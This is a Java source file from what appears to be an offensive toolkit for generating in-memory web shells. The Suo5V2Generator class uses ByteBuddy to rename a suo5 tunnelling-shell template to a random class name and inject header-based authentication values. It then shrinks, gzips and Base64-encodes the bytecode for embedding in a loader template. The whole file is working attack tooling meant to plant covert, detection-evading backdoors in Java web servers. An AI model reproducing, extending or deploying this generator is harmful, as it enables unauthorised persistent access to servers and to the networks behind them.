package com.reajason.javaweb.memshell.shelltool.suo5v2;

import com.reajason.javaweb.memshell.generator.ByteBuddyShellGenerator;

import com.reajason.javaweb.ClassBytesShrink;
import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.shelltool.suo5v2.Suo5v2;
import com.reajason.javaweb.utils.CommonUtil;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;
import com.reajason.javaweb.utils.Base64Utils;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2025/2/12
 */
public class Suo5V2Generator extends ByteBuddyShellGenerator<Suo5v2Config> {

    public Suo5V2Generator(ShellConfig shellConfig, Suo5v2Config suo5Config) {
        super(shellConfig, suo5Config);
    }

    @Override
    protected DynamicType.Builder<?> getBuilder() {
        if (Suo5v2.class.getName().equals(shellToolConfig.getShellTemplateClassName())) {
            return redefineTemplate()
                    .field(named("headerName")).value(shellToolConfig.getHeaderName())
                    .field(named("headerValue")).value(shellToolConfig.getHeaderValue());
        }
        try (DynamicType.Unloaded<Suo5v2> unloaded = new ByteBuddy()
                .redefine(Suo5v2.class)
                .name(CommonUtil.generateClassName())
                .field(named("headerName")).value(shellToolConfig.getHeaderName())
                .field(named("headerValue")).value(shellToolConfig.getHeaderValue())
                .visit(TargetJreVersionVisitorWrapper.DEFAULT)
                .make()) {
            byte[] shrinkBytes = ClassBytesShrink.shrink(unloaded.getBytes(), true);
            return redefineTemplate()
                    .field(named("suo5V2GZipBase64")).value(Base64Utils.encodeBase64String(CommonUtil.gzipCompress(shrinkBytes)));
        }
    }
}
